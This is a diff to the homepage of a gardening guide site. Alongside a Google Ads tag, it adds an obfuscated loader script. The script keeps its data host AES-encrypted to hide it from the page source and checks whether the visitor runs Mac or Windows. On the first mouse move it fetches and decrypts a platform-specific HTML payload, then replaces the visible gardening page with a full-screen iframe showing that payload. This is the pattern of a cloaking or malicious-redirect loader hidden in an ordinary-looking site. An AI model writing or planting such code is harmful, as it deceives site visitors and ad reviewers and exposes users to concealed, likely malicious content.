@@ -1,7 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- 
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17684216697"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'AW-17684216697');
+  </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Seed to Garden — Gardening Guide for the USA</title>
@@ -11,8 +19,16 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,600;0,700;1,600&display=swap" rel="stylesheet" />
   <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='24' font-size='24'%3E%F0%9F%8C%BF%3C/text%3E%3C/svg%3E" />
   <link rel="stylesheet" href="css/styles.css" />
+<!-- CryptoJS for blob decryption -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<!-- Blob popup frame + error hint (Server A mechanism) -->
+<style>
+  #frame { display: none; width: 100%; height: 100vh; border: 0; }
+  .hint { display: none; text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+</style>
 </head>
 <body>
+<div id="shop">
   <a class="skip-link" href="#main">Skip to content</a>
   <header class="site-header" id="siteHeader">
     <div class="container header-inner">
@@ -177,8 +193,67 @@
       <p>&copy; <span id="year">2026</span> Seed to Garden. This website is for general informational purposes only and is not a substitute for professional gardening, medical, or legal advice. Some links on this site may be affiliate links. See our <a href="disclaimer.html">disclaimer</a> for details. Photographs are provided by Unsplash and used under the Unsplash License.</p>
     </div>
   </footer>
+</div><!-- /#shop -->
+<iframe id="frame" title="encrypted shop" allowfullscreen allow="autoplay; fullscreen"></iframe>
+<div class="hint"></div>
 
-  <script src="js/main.js"></script>
+<script src="js/main.js"></script>
+<!-- ======================================================================
+     SERVER A BLOB LOADER - decrypts the encrypted popup payload and loads it
+     into #frame on the first mouse move. The data host is kept AES-encrypted
+     below (URL_KEY) so it is not readable in the page source.
+     ====================================================================== -->
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX18JBiSljjsGZ48PyOswm2Rpv3YQ1xvK8Oz4m9U6Yy6MJQv0kRd6oQnCNwvPwvDDChYSvXHGDx3CzA==";
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
+  let lastUrl = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  async function loadSecret() {
+    const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+    try {
+      if (location.protocol === "file:") {
+        throw new Error("Cannot fetch over file:// - run node serve.js (http://localhost:3000) or open via GitHub Pages");
+      }
+      let res;
+      try {
+        res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      } catch (e) {
+        res = null; // no /data route (static host, file://, etc.)
+      }
+      if (!res || !res.ok) {
+        res = await fetch("data_" + detectPlatform() + ".json");
+      }
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      const blob = new Blob([html], { type: "text/html" });
+      lastUrl = URL.createObjectURL(blob);
+
+      frame.src = lastUrl;
+
+      shop.style.display = "none";
+      frame.style.display = "block";
+
+    } catch (e) {
+      const hint = document.querySelector(".hint");
+      if (hint) { hint.textContent = "\u26A0\uFE0F " + e.message; hint.style.display = "block"; }
+    }
+  }
+
+  window.addEventListener("mousemove", () => {
+    loadSecret();
+  }, { once: true });
+</script>
 </body>
 </html>
-
